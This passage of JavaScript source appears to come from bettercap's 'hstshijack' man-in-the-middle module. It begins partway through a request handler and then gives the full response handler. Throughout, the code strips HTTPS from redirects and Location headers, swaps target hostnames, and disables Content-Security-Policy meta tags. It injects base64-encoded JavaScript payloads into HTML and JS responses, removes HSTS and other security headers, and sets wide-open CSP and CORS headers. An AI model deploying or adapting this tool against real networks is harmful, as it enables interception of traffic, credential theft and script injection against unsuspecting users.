			for (var a = 0; a < ssl_log.length; a++) {
				regexp = new RegExp( "http://" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^a-z0-9\\-\\.]|$)", "ig" )
				if ( req.Headers.match(regexp) ) {
					req.Headers = req.Headers.replace(regexp, "https://" + ssl_log[a] + "$1")
					log_debug(on_blue + "hstshijack" + reset + " Patched SSL of " + ssl_log[a] + " in request headers.")
				}
			}

			// Patch scheme of request if host is found in SSL log.
			if (req.Scheme != "https") {
				if ( ssl_log.indexOf(req.Hostname) > -1 ) {
					req.Scheme = "https"
					log_debug(on_blue + "hstshijack" + reset + " Found " + bold + req.Hostname + reset + " in SSL log. Upgraded scheme to HTTPS.")
				} else {
					for (var i = 0; i < target_hosts; i++) {
						whole_regexp_set = toWholeRegexpSet(target_hosts[i], "")
						if ( req.Hostname.match(whole_regexp_set[0]) ) {
							req.Scheme = "https"
							log_debug(on_blue + "hstshijack" + reset + " Found " + bold + req.Hostname + reset + " in hstshijack.targets. Upgraded scheme to HTTPS.")
							break
						}
					}
				}
			}

		}

	}

}

function onResponse(req, res) {

/* Remember HTTPS redirects */

	// Write to SSL log.
	// Check if host responded with HTTPS redirection.
	location = res.GetHeader("Location", "")
	if ( location.match(/^https:\/\//i) ) {
		ssl_log = readFile( env["hstshijack.log"] ).split("\n")
		host    = location.replace(/https:\/\//i, "").replace(/[:/?#].*/i, "")
		if ( ssl_log.indexOf(host) == -1 ) {
			ssl_log.push(host)
			writeFile( env["hstshijack.log"], ssl_log.join("\n") )
			log_debug(on_blue + "hstshijack" + reset + " Saved " + host + " to SSL log.")
		}
	}

/* Attack or ignore response */

	ignored = false

	// Ignore this response if required.
	if ( res.GetHeader("bettercap", "") == "ignore" ) {
		res.RemoveHeader("bettercap")
		ignored = true
		log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
	} else {
		for (var a = 0; a < ignore_hosts.length; a++) {
			var whole_regexp_set
			if ( !ignore_hosts[a].match(/^\*$/) ) {
				whole_regexp_set = toWholeRegexpSet(ignore_hosts[a], "")
			}
			if ( ignore_hosts[a].match(/^\*$/) || req.Hostname.match(whole_regexp_set[0]) ) {
				ignored = true

				// Don't ignore response if there's a replacement for the requested host.
				for (var b = 0; b < target_hosts.length; b++) {
					whole_regexp_set = toWholeRegexpSet(target_hosts[b], "")
					if ( req.Hostname.match(whole_regexp_set[0]) ) {
						ignored = false
						break
					}
				}

				// Don't ignore response if there's a custom payload for the requested host.
				if (ignored) {
					for ( var b = 0; b < Object.keys(payloads).length; b++ ) {
						payload_target_host = Object.keys(payloads)[b].replace(/\:.*/, "")
						if ( !payload_target_host.match(/^\*$/) ) {
							whole_regexp_set = toWholeRegexpSet(payload_target_host, "")
						}
						if ( payload_target_host.match(/^\*$/) || req.Hostname.match(whole_regexp_set[0]) ) {
							ignored = false
							break
						}
					}
				}

				if (ignored) {
					log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".")
				}

				break
			}
		}
	}

	if (!ignored) {
		res.ReadBody()

	/* Attack meta tag redirection */

		// SSLstrip meta tag redirection.
		if ( res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")/ig) ) {
			meta_tags = res.Body.match(/<meta(.*?)http\-equiv=(\'|\")refresh(\'|\")(.*?)(\/\s*|)>/ig) || []
			for (var a = 0; a < meta_tags.length; a++) {
				log_debug(on_blue + "hstshijack" + reset + " Found " + meta_tags.length + " meta tag(s) in the response body.")

				if ( meta_tags[a].match(/https:\/\//ig) ) {
					replacement = meta_tags[a].replace(/https:\/\//ig, "http://")
					res.Body.replace(meta_tags[a], replacement)
					log_debug(on_blue + "hstshijack" + reset + " Stripped meta tag(s) from SSL.")
				}

				// Hijack hostnames in redirecting meta tags.
				for (var b = 0; b < target_hosts.length; b++) {
					regexp_set = toRegexpSet(target_hosts[b], replacement_hosts[b])
					if ( meta_tags[a].match(regexp_set[0]) ) {
						hijacked_meta_tag = meta_tags[a].replace(regexp_set[0], regexp_set[1])
						res.Body = res.Body.replace(meta_tags[a], hijacked_meta_tag)
						log_debug(on_blue + "hstshijack" + reset + " Hijacked meta tag by replacing " + bold + target_hosts[b] + reset + " with " + bold + replacement_hosts[b] + reset + ".")
						break
					}
				}
			}
		}

	/* Attack meta tag CSP restrictions */

		res.Body = res.Body.replace(/http-equiv=('|")Content-Security-Policy('|")/ig, "http-equiv=$1Content-Insecure-Policy$2")

	/* JavaScript */

		// Block scripts on this host if required.
		for (var i = 0; i < block_script_hosts.length; i++) {
			var whole_regexp_set
			if ( !block_script_hosts[i].match(/^\*$/) ) {
				whole_regexp_set = toWholeRegexpSet(block_script_hosts[i], "")
			}
			if ( block_script_hosts[i].match(/^\*$/) || req.Hostname.match(whole_regexp_set[0]) ) {
				res.Body = res.Body.replace(/<script.*?>/ig, "<div style=\"display:none;\">")
				res.Body = res.Body.replace(/<\/script>/ig, "</div>")
				if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
					res.Body = ""
				}
				log_debug(on_blue + "hstshijack" + reset + " Blocked script(s) from " + bold + req.Hostname + reset + ".")
				break
			}
		}

		// Inject payloads.
		injection = payload
		injecting = false

		// Assemble payload.
		for ( var a = 0; a < Object.keys(payloads).length; a++ ) {
			host = Object.keys(payloads)[a]
			if ( host.match(/^\*$/) || req.Hostname.match( toWholeRegexpSet(host, "")[0] ) ) {
				injecting = true
				injection = injection.replace("{{CUSTOM_PAYLOAD_TAG}}", payloads[host].payload.replace(/\$/g, "$$$$") + "\n{{CUSTOM_PAYLOAD_TAG}}")
				log_debug(on_blue + "hstshijack" + reset + " Attempting to inject payload(s) into document from " + bold + req.Hostname + reset + ".")
			}
		}

		if (injecting) {
			injection = injection.replace("{{CUSTOM_PAYLOAD_TAG}}", "")
			// Inject JavaScript documents.
			if ( res.ContentType.match(/[a-z]+\/javascript/i) || req.Path.replace(/\?.*/i, "").match(/\.js$/i) ) {
				res.Body = injection + res.Body
				log_debug(on_blue + "hstshijack" + reset + " Injected payloads into JS file from " + bold + req.Hostname + reset + ".")
			} else {
				// Limit body scanning buffer.
				res_inject_buffer = res.Body.substr(0, 1000)
				res_injected_buffer = ""
				// Inject HTML documents.
				if (res_inject_buffer.length != 0) {
					if ( res_inject_buffer.match(/<head(?: [^>]*?|)>/i) ) {
						payload_marker = randomString(16)
						res_injected_buffer = res_inject_buffer.replace(/<head( [^>]*?|)>/i, "<head$1><script src=\"data:application/javascript;base64," + payload_marker + "\"></script>")
						res_injected_buffer = res_injected_buffer.replace( payload_marker, btoa(injection) )
						res.Body = res_injected_buffer + res.Body.substr(1000)
						log_debug(on_blue + "hstshijack" + reset + " Injected payloads into HTML file from " + bold + req.Hostname + reset + ".")
					}
				}
			}
		}

	/* Response headers */

		// SSLstrip location header.
		location = res.GetHeader("Location", "")
		if (location != "") {
			stripped_location = location.replace(/(http)s:\/\//i, "$1://").replace(/:443($|[/?#])/, "$1")
			res.SetHeader("Location", stripped_location)
			log_debug(on_blue + "hstshijack" + reset + " Stripped SSL from location header.")
		}

		// Hijack hosts in headers.
		for (var a = 0; a < target_hosts.length; a++) {
			regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a])
			if ( res.Headers.match(regexp_set[0]) ) {
				res.Headers = res.Headers.replace(regexp_set[0], regexp_set[1])
				log_debug(on_blue + "hstshijack" + reset + " Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
				break
			}
		}

		// Remove security headers.
		res.RemoveHeader("Strict-Transport-Security")
		res.RemoveHeader("Content-Security-Policy-Report-Only")
		res.RemoveHeader("Public-Key-Pins")
		res.RemoveHeader("Public-Key-Pins-Report-Only")
		res.RemoveHeader("X-Frame-Options")
		res.RemoveHeader("X-Content-Type-Options")
		res.RemoveHeader("X-Download-Options")
		res.RemoveHeader("X-Permitted-Cross-Domain-Policies")
		res.RemoveHeader("X-XSS-Protection")
		res.RemoveHeader("Expect-Ct")

		// Set insecure headers.
		res.SetHeader("Content-Security-Policy", "default-src * data: 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
		res.SetHeader("X-WebKit-CSP", "default-src * data: 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
		res.SetHeader("X-Content-Security-Policy", "default-src * data: 'unsafe-inline' 'unsafe-eval'; script-src * data: 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';")
		res.SetHeader("Access-Control-Allow-Origin", "*")
		res.SetHeader("Access-Control-Allow-Methods", "*")
		res.SetHeader("Access-Control-Allow-Headers", "*")
		res.SetHeader("Cache-Control", "no-cache, no-store, must-revalidate")
		res.SetHeader("Expires", "Fri, 20 Apr 2018 04:20:00 GMT")
		res.SetHeader("Pragma", "no-cache")

	}

}
